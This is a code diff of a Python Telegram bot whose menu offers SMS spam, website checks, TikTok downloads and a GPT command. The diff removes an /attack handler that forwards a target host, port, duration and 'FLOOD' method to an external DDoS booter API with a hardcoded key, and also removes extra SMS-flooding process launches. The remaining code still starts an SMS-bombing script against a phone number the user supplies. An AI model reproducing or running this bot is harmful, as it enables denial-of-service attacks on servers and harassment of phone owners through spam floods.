@@ -1,6 +1,3 @@
-from keep_alive import keep_alive
-keep_alive()
-
 from gtts import gTTS
 from googletrans import Translator
 import telebot
@@ -162,9 +159,6 @@ def lqm_sms(message):
 
     file_path1 = os.path.join(os.getcwd(), "sms.py")
     process = subprocess.Popen(["python", file_path, phone_number, "400"])    
-    process = subprocess.Popen(["python", file_path2, phone_number, "200"])
-    process = subprocess.Popen(["python", file_path3, phone_number, "300"])
-    process = subprocess.Popen(["python", file_path4, phone_number, "300"])
     processes.append(process)
     username = message.from_user.username
 
@@ -185,7 +179,6 @@ def how_to(message):
   how_to_text = '''
  How to use and All Bot commands:
 ┌──────────⭓
-│» /attack : Website Attack 
 │» /free : Spam sms, for example: /free 038xxxxxxx
 │» /check_website : Check Website. For example: /check_website + link
 │» /check_host : Check the website server. For example : /check_host + link
@@ -194,7 +187,6 @@ def how_to(message):
 │» /tiktok : Download tiktok videos
 │» /ask : GPT BOT
 │» /id : check id you
-│» /check : /check + [link] check anti ddos
 │» /capcut : download video tiktok 
 │» /status.
 │» /admin: Display admin information.
@@ -367,43 +359,6 @@ def handle_capcut(message):
 
 
 
-@bot.message_handler(commands=['attack'])
-def attack_command(message):
-    user_id = message.from_user.id
-    
-        
-    if len(message.text.split()) < 5:
-        bot.reply_to(message, ' 𝑷𝒍𝒆𝒂𝒔𝒆 𝑬𝒏𝒕𝒆𝒓 𝑪𝒐𝒓𝒓𝒆𝒄𝒕 𝑺𝒚𝒏𝒕𝒂𝒙.\n𝑭𝒐𝒓 𝑬𝒙𝒂𝒎𝒑𝒍𝒆 : /attack + [𝒉𝒐𝒔𝒕] + [𝒑𝒐𝒓𝒕] + [𝒕𝒊𝒎𝒆] + [𝒎𝒆𝒕𝒉𝒐𝒅𝒔]\nCurrent Methods:\n FLOOD')
-        return
-
-    username = message.from_user.username
-
-    args = message.text.split()
-    host = args[1]
-    port = args[2]
-    time = args[3]
-    method = args[4]
-
-    if int(time) > 61:
-        bot.reply_to(message, '𝑨𝒕𝒕𝒂𝒄𝒌 𝑻𝒊𝒎𝒆 𝑪𝒂𝒏𝒏𝒐𝒕 𝑬𝒙𝒄𝒆𝒆𝒅 𝟔𝟎 𝑺𝒆𝒄𝒐𝒏𝒅𝒔.')
-        return
-
-    username = message.from_user.username
-
-    bot.reply_to(message, f'𝐬𝐞𝐧𝐝𝐢𝐧𝐠 𝐫𝐞𝐪𝐮𝐞𝐬𝐭 𝐭𝐨 𝐚𝐩𝐢 𝐬𝐞𝐫𝐯𝐞𝐫 𝐟𝐚𝐢𝐥𝐞𝐝')
-
-    args = message.text.split()
-    host = args[1]
-    port = args[2]
-    time = args[3]
-    method = args[4]
-    
-    # Gửi dữ liệu tới api
-    api = f"https://kha.bartrickc2.ovh/api/attack?host=[host]&port=[port]&time=[time]&method={method}&key=dvinkls&username=ducvinhlord"
-    response = requests.get(api)
-    print("\n", response.text, "\n")
-
-    bot.reply_to(message, f'Attack Target Successfully\n┣➤ 𝐀𝐭𝐭𝐚𝐜𝐤 𝐁𝐲 : @{username}\n┣➤ 𝐓𝐚𝐫𝐠𝐞𝐭 : {host}\n┣➤ 𝐏𝐨𝐫𝐭 : {port}\n┣➤ 𝐓𝐢𝐦𝐞 : {time}\n┣➤ 𝐌𝐞𝐭𝐡𝐨𝐝 : {method}')
     
 
 
